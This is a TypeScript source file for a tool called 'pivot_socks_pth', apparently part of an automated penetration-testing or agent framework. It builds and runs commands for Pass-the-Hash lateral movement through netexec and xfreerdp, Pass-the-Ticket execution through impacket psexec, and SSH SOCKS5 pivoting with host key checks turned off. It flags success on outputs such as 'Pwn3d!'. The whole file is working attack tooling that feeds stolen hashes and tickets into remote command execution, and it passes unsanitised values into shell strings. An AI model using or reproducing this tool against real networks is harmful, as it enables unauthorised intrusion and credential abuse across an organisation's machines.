// T77 — pivot_socks_pth
// SOCKS5 pivot, Pass-the-Hash (PTH), and Pass-the-Ticket (PTT) via netexec/impacket.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'pivot_socks_pth',
  description:
    'Network pivoting and lateral movement tool. Supports: SOCKS5 proxy setup via SSH dynamic forward, ' +
    'Pass-the-Hash (PTH) lateral movement via SMB/WinRM/RDP using NTLM hashes, and Pass-the-Ticket (PTT) ' +
    'with Kerberos TGT injection. Uses netexec for PTH and impacket ticketer/psexec for PTT.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'target',       type: 'string', required: true,  description: 'Target host/IP for lateral movement' },
    { name: 'credentials',  type: 'string', required: true,  description: 'Credentials — format depends on pivot_type: PTH: "DOMAIN\\user:LMHASH:NTHASH", PTT: "/path/to/ticket.ccache", SOCKS: "user:password"' },
    { name: 'pivot_type',   type: 'string', required: false, description: 'Pivot type: pth / ptt / socks5', default: 'pth' },
    { name: 'protocol',     type: 'string', required: false, description: 'Protocol for PTH: smb / winrm / rdp', default: 'smb' },
    { name: 'command',      type: 'string', required: false, description: 'Command to execute post-pivot', default: 'whoami /all' },
    { name: 'listen_port',  type: 'number', required: false, description: 'Local SOCKS5 listen port', default: 1080 },
    { name: 'domain',       type: 'string', required: false, description: 'Domain name' },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Execution timeout ms', default: 60000 },
  ],
};

export const pivotSocksPthTool = {
  definition,
  async execute(params: Record<string, unknown>, exec: CommandExecutor): Promise<ToolResult> {
    const target = String(params.target || '');
    const credentials = String(params.credentials || '');
    const pivotType = String(params.pivot_type || 'pth').toLowerCase();
    const protocol = String(params.protocol || 'smb').toLowerCase();
    const command = String(params.command || 'whoami /all');
    const listenPort = Number(params.listen_port || 1080);
    const domain = params.domain ? String(params.domain) : 'WORKGROUP';
    const timeoutMs = Number(params.timeout_ms || 60000);

    if (!target) return { output: 'target required', parsed: { error: 'missing_target' } };
    if (!credentials) return { output: 'credentials required', parsed: { error: 'missing_credentials' } };

    let cmd = '';
    let description = '';

    if (pivotType === 'pth') {
      // Pass-the-Hash via netexec
      // Credentials format: "DOMAIN\\user:LMHASH:NTHASH" or ":NTHASH"
      const parts = credentials.split(':');
      const domainUser = parts[0];
      const ntHash = parts[parts.length - 1];
      const [credDomain, user] = domainUser.includes('\\') ? domainUser.split('\\') : [domain, domainUser];

      if (protocol === 'smb') {
        cmd = `netexec smb ${target} -u '${user}' -H '${ntHash}' -d '${credDomain}' -x '${command.replace(/'/g, "\\'")}' 2>&1`;
        description = `PTH SMB exec on ${target} as ${credDomain}\\${user}`;
      } else if (protocol === 'winrm') {
        cmd = `netexec winrm ${target} -u '${user}' -H '${ntHash}' -d '${credDomain}' -x '${command.replace(/'/g, "\\'")}' 2>&1`;
        description = `PTH WinRM exec on ${target} as ${credDomain}\\${user}`;
      } else if (protocol === 'rdp') {
        cmd = `xfreerdp /v:${target} /u:${user} /pth:${ntHash} /d:${credDomain} /cert:ignore +auto-reconnect /dynamic-resolution 2>&1`;
        description = `PTH RDP session to ${target} as ${credDomain}\\${user}`;
      }
    } else if (pivotType === 'ptt') {
      // Pass-the-Ticket — export ticket then use with impacket
      const ticketPath = credentials; // path to .ccache file
      cmd = `KRB5CCNAME=${ticketPath} python3 -m impacket.examples.psexec -k -no-pass ${domain}/${target} 2>&1 <<'EOF'
${command}
exit
EOF`;
      description = `PTT psexec on ${target} using ticket ${ticketPath}`;
    } else if (pivotType === 'socks5') {
      // SOCKS5 via SSH dynamic forward
      const [sshUser, sshPass] = credentials.split(':');
      cmd = `sshpass -p '${(sshPass || '').replace(/'/g, "\\'")}' ssh -o StrictHostKeyChecking=no -o BatchMode=no -D ${listenPort} -f -N ${sshUser}@${target} 2>&1 && echo "SOCKS5 proxy started on 127.0.0.1:${listenPort}"`;
      description = `SOCKS5 dynamic forward via SSH to ${target}, listening on :${listenPort}`;
    }

    if (!cmd) return { output: `Unknown pivot_type: ${pivotType}`, parsed: { error: 'unknown_pivot_type' } };

    try {
      const result = await exec.executeShell(cmd, timeoutMs);
      const output = (result.stdout + result.stderr).substring(0, 800);
      const success = output.includes('[+]') || output.includes('Pwn3d!') ||
                      output.includes('whoami') || output.includes('NT AUTHORITY') ||
                      output.includes('SOCKS5 proxy started');

      const lines = [
        `pivot_socks_pth — ${pivotType.toUpperCase()}  ${description}`,
        `Status: ${success ? '⚡ SUCCESS' : 'failed or no output'}`,
        '─'.repeat(72),
        output,
      ];

      return {
        output: lines.join('\n'),
        parsed: { pivot_type: pivotType, target, success, output: output.substring(0, 500) },
      };
    } catch (err) {
      return { output: `pivot_socks_pth error: ${String(err)}`, parsed: { error: String(err) } };
    }
  },
};
